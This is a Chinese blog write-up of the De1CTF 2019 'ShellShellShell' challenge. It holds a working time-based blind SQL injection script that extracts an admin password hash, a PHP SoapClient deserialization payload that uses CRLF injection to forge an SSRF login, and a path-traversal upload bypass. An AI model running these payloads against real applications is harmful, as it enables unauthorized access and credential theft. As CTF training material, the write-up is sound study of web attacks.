---
title: '[De1CTF 2019]ShellShellShell'
author: Troy3e
avatar: >-
  https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg
authorAbout: steamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-03-11 16:38:01
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1135807.jpg
---
好久没更新了，今天开始恢复学习模式。
本学期目标：两天一个BuuWP，多打比赛，加入一个大佬战队，剩下的时间都学习渗透。

这题知识量巨大，看了很多wp，首先先自动审一下源码：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210310214904.png)

一个个看，首先看config.php相应位置代码：


    public function insert($columns,$table,$values){

        $column = $this->get_column($columns);
        $value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';
        $nid =
        $sql = 'insert into '.$table.'('.$column.') values '.$value;
        $result = $this->conn->query($sql);

        return $result;
    }

会把反引号替换为单引号，为sql注入创建了条件。

接下来找到用到insert函数的地方：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210310225646.png)

可以看到$_POST['signature']未经过滤就被直接插入。

又由于上面insert函数将所有反引号转为单引号，直接盲注：

    import requests
    
    url="http://a5c4dff4-3e02-4263-8d4a-51aa1ae72651.node3.buuoj.cn/index.php?action=publish"
    cookie = {"PHPSESSID":"3dk4p3o188kgg1vhvds81qafn2"}

    k="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    flag=""

    for i in range(50):
        for j in k:
            j = ord(j)
            data={
                'mood':'0',
                'signature':'1`,if(ascii(substr((select password from ctf_users where username=`admin`),{},1))={},sleep(3),0))#'.format(i,j)
                }
            try:
                r=requests.post(url,data=data,cookies=cookie,timeout=(2,2))
            except:
                flag+=chr(j)
                print(flag)
                break

跑出来密码的md5为：c991707fdf339958eded91331fb11ba0
解密得jaivypassword。

但是登录却提示ip限制。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311123409.png)

从源码中看到注册需要验证ip

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311124123.png)

跟进get_ip函数

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311124051.png)

REMOTEADDR无法直接伪造，所以寻找ssrf的点。
到这就不知道咋做了，照理说soapclient反序列化配合ssrf以前是遇到过的，不过还是没想出来。

?action=phpinfo（源码中看到的）看到php开启了soap拓展

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311124745.png)

PHP 中，soap扩展可以用来提供和使用 Web Services
soapclient类则是用来创建soap数据报文，与wsdl接口进行交互，它有几个内置魔术方法

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311125817.png)

showmess类里有一个反序列化

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311131339.png)

他看上去会因为sql注入引发反序列化漏洞。
所以我们可以注入

    a`, {serialize object});#

到库中
然后他会在你访问
index.php?action=index 的时候触发

接下来看soapclient类
这个类的用法如下

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311132909.png)

通过传入两个参数，第一个是 $url, 既目标url, 第二个参数是一个数组，里面是soap请求的一些参数和属性。

我们来查阅一下第二个参数(options)的相关介绍：
我们可以看到这个类传入的第一个参数为 $wsdl

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311133539.png)

控制是否是wsdl模式，如果为NULL，就是非wsdl模式.
如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求，

我们可以在 PHP 源码中看到

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311133811.png)

如果把 \x0d\x0a 注入到 SOAPAction , 这个POST请求的部分header会被控制(CRLF)
但是我们不能控制 Content-Type,就不能控制POST的数据，所以就不能登录admin。

继续阅读php源码，我们发现user_agent 选项同样可以造成 CRLF

在header里 User-Agent 在 Content-Type 前面, 我们我们可以很轻松的控制整个POST报文

可以生成任意POST报文的POC：

    <?php
    $target = 'http://127.0.0.1/index.php?action=login';
    $post_string = 'username=admin&password=jaivypassword&code=1278816';
    $headers = array(
        'X-Forwarded-For: 127.0.0.1',
        'Cookie: PHPSESSID=46ek6rejdtj36sm2sk2psu1i02'
        );
    $b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));

    $aaa = serialize($b);
    $aaa = str_replace('^^',"\r\n",$aaa);
    $aaa = str_replace('&','&',$aaa);
    echo bin2hex($aaa);
    ?>

这里注意target那里是127.0.0.1(因为是ssrf)，一开始没注意直接用的url，花了两小时踩坑。

成功进去之后是一个上传

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311155056.png)

ifconfig查看ip

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311161429.png)

端口80开放
把源码下下来

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311161504.png)

访问

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311161631.png)

第一层数组来绕过，第二层随机文件名用路径穿越绕过。
构造file[1]=aaa&file[0]=php/../troy3e.php
postman构造传入
这里懒得构造了，因为已经被这题折磨了一下午了，拿个现成的upload：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311162645.png)

做了一下午，脑子都晕了QWQ

参考链接：
https://blog.csdn.net/qq_43756333/article/details/107386403
https://my.oschina.net/u/4410805/blog/3391684
https://blog.csdn.net/a3320315/article/details/104088080
https://www.freesion.com/article/5426702156/
https://xz.aliyun.com/t/2148#toc-0